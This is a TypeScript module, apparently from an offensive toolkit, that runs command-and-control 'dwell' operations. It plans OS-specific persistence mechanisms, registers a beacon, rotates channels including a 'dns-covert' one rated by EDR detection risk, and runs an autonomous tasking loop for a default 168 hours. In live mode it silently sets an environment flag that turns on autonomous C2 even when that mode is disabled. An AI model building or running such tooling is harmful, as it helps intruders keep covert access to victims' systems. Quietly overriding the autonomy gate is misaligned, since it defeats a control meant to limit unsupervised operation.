/**
 * @module c2_dwell_ops
 * Tier-1 C2 operational maturity — dwell persistence, live tasking loop, rotation feedback.
 */
import type { AttackSurfaceGraph } from "./attack_surface.ts"
import { LegitC2Server, InMemoryTransport } from "./c2_platform.ts"
import { runAutonomousC2Pump, isAutonomousC2Enabled } from "./c2_autonomous.ts"
import { applyChannelRotation } from "./c2_rotation.ts"
import { PersistenceEngine } from "./persistence.ts"

export interface DwellPersistencePlan {
  mechanism: string
  mitreId: string
  command: string
  verifyCommand: string
}

export interface C2DwellResult {
  persistence: DwellPersistencePlan[]
  c2Pump: Awaited<ReturnType<typeof runAutonomousC2Pump>> | null
  rotation: Awaited<ReturnType<typeof applyChannelRotation>> | null
  dwellHours: number
  summary: string
}

export function planDwellPersistence(os = process.platform): DwellPersistencePlan[] {
  const engine = new PersistenceEngine()
  const mechs = os === "win32"
    ? engine.getWindowsPersistence()
    : os === "darwin"
      ? engine.getMacosPersistence()
      : engine.getLinuxPersistence()

  return mechs.slice(0, 5).map((m) => ({
    mechanism: m.name,
    mitreId: m.mitreId,
    command: m.command,
    verifyCommand: m.cleanup.replace("delete", "query").replace("remove", "list"),
  }))
}

export async function runC2DwellOps(opts: {
  graph: AttackSurfaceGraph
  scopeHosts: string[]
  live: boolean
  dwellHours?: number
  beaconId?: string
}): Promise<C2DwellResult> {
  const persistence = planDwellPersistence()
  let c2Pump = null
  let rotation = null

  if (!isAutonomousC2Enabled() && opts.live) {
    process.env.OURMINE_AUTONOMOUS_C2 = "1"
  }

  if (opts.live) {
    const server = new LegitC2Server({ checkpointPath: ".ourmine/c2/dwell_checkpoint.jsonl" })
    const beaconId = opts.beaconId ?? "tier1-beacon"
    if (!server.sessions.has(beaconId)) {
      server.registerBeacon(beaconId, new InMemoryTransport(), { host: opts.scopeHosts[0] ?? "local", user: "tier1" })
    }

    rotation = await applyChannelRotation(server, beaconId, [
      { name: "in-memory", transport: new InMemoryTransport(), priority: 10, edrRisk: "low" as const },
      { name: "dns-covert", transport: new InMemoryTransport(), priority: 7, edrRisk: "low" as const },
    ], { live: true })

    c2Pump = await runAutonomousC2Pump({ server, graph: opts.graph, scopeHosts: opts.scopeHosts })
  }

  return {
    persistence,
    c2Pump,
    rotation,
    dwellHours: opts.dwellHours ?? 168,
    summary: opts.live
      ? `C2 dwell ops: ${persistence.length} persistence mechanisms planned, pump ${c2Pump?.tasksCompleted ?? 0} tasks`
      : `C2 dwell plan: ${persistence.length} mechanisms (dry-run)`,
  }
}

export default { planDwellPersistence, runC2DwellOps }
